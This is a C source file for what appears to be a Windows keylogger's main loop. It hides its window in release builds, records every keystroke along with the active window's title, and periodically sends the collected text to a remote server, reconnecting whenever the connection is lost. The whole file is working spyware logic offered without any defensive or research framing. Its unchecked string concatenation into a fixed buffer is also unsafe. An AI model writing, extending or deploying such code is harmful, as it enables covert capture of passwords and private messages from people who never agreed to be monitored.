#include "Definitions.h"
#include "Configs.h"
#include "Utils.h"
#include "Networking.h"
#include "System.h"
#include <stdio.h>

#ifdef DEBUG  
int main(int argc, char **argv) 
#else 
int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLinde, _In_ int nCmdSHow)
#endif
{

	WelcomeMessage();

	SOCKET serverSock = connectToServer();
	bool isConnected = checkConnection(serverSock);
	int fromLastCheckSeconds = 0;
	char lastWindowName[256] = "";

	char capturedData[1024] = "";

	while (true) {

		const int delayMiliseconds = 200;
		Sleep(delayMiliseconds); 
		if (fromLastCheckSeconds++ >= CONNECTION_CHECKING_INTERVAL / delayMiliseconds) {
			isConnected = checkConnection(serverSock);
			fromLastCheckSeconds = 0;
		}

		if (!isConnected) {
			// Connecting To Server Again
			serverSock = NULL;
			while (!isConnected) {
				log(LOG_LINE); 
				log("Trying again in next seconds...");
				Sleep(CONECTING_RETRY_DELAY); 
				serverSock = connectToServer(); 
				isConnected = checkConnection(serverSock);
			}
			log("Connected.");
		}


		int CapturedCharacter = CaptureKeyboard();

		if (CapturedCharacter != NULL) {

			char wndName[512];
			GetCurrentWindowName(wndName);

			if (strcmp(wndName, lastWindowName) != 0) {
				strcat(capturedData, "\n----------------------------------------------------------------------------------------------\n");
				strcat(capturedData, "Window Title : ");
				strcat(capturedData, wndName);
				strcat(capturedData, "\n");

				strcpy(lastWindowName, wndName); // set the last window name
			}

			char pressed_key[32] = {0};
			TranslateVK(CapturedCharacter, pressed_key);
			
			strcat(capturedData, pressed_key);
			
			if(strlen(capturedData) >= MINIMUM_SENDING_CAPTURED_LENGTH ) {
				bool succeeded = sendMessage(serverSock, capturedData);
				capturedData[0] = '\0'; // after sending we reset the variable
				if (!succeeded) {
					log("Disconnected while sending a message!");
					isConnected = false;
					closesocket(serverSock);
				}
			} 

		}

	}		
	return 0;
}